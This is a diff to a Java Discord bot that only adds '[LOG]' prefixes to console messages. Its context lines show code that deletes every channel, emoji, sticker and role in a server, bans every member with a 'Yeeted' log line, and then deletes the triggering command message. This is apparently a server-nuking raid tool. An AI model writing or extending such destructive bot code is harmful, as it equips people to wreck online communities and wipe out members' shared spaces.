@@ -165,7 +165,7 @@ public final class Bot {
                     guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
                 });
             } else {
-                System.out.println("No channels found.");
+                System.out.println("[LOG] No channels found.");
             }
 
             // Check if there is emojis/stickers and delete them
@@ -177,7 +177,7 @@ public final class Bot {
                     guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
                 });
             } else {
-                System.out.println("No emojis/stickers found.");
+                System.out.println("[LOG] No emojis/stickers found.");
             }
 
             // Check if there are roles and delete them
@@ -186,7 +186,7 @@ public final class Bot {
                     if (guild.getRoles().size() > 1) {
                         role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
                     } else {
-                        System.out.println("No roles found.");
+                        System.out.println("[LOG] No roles found.");
                     }
                 } catch (Exception ignored) {
 
@@ -199,7 +199,7 @@ public final class Bot {
                     if (guild.getMembers().size() > 1) {
                         member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
                     } else {
-                        System.out.println("No members found.");
+                        System.out.println("[LOG] No members found.");
                     }
                 } catch (Exception ignored) {
 
@@ -225,7 +225,7 @@ public final class Bot {
                     guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
                 });
             } else {
-                System.out.println("No emojis/stickers found.");
+                System.out.println("[LOG] No emojis/stickers found.");
             }
 
             event.getMessage().delete().queue();
@@ -244,7 +244,7 @@ public final class Bot {
                     guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
                 });
             } else {
-                System.out.println("No channels found.");
+                System.out.println("[LOG] No channels found.");
             }
 
             event.getMessage().delete().queue();
@@ -263,7 +263,7 @@ public final class Bot {
                     if (guild.getRoles().size() > 1) {
                         role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
                     } else {
-                        System.out.println("No roles found.");
+                        System.out.println("[LOG] No roles found.");
                     }
                 } catch (Exception ignored) {
 
@@ -286,7 +286,7 @@ public final class Bot {
                     if (guild.getMembers().size() > 1) {
                         member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
                     } else {
-                        System.out.println("No members found.");
+                        System.out.println("[LOG] No members found.");
                     }
                 } catch (Exception ignored) {
 
